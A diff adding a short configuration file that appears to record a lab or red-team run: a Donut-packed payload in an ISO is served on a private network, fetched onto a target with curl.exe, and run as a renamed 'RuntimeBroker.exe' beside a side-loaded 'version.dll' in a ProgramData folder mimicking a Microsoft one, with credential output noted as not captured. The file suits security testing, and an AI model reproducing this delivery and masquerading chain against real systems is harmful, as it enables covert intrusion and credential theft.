@@ -1,0 +1,14 @@
+scenario=run-c
+delivery_bind=192.168.1.50:18080
+delivery_object=donut-delivery.iso
+target=192.168.1.52
+allowed_network=192.168.1.0/24
+donut_options=-a 2 -b 1 -e 1 -z 1 with embedded approved module arguments
+planted_images=RuntimeBroker.exe,version.dll,riched32.dat
+renamed_form=RuntimeBroker.exe
+injection_hosts=none
+target_delivery=curl.exe http://192.168.1.50:18080/donut-delivery.iso
+target_execute=C:\ProgramData\Microsoft\NetTokenBroker\RuntimeBroker.exe
+network_behavior=none expected from embedded payload; no C2 configured
+credential_output=not captured, pulled, inspected, or committed
+delivery_result=GET 200
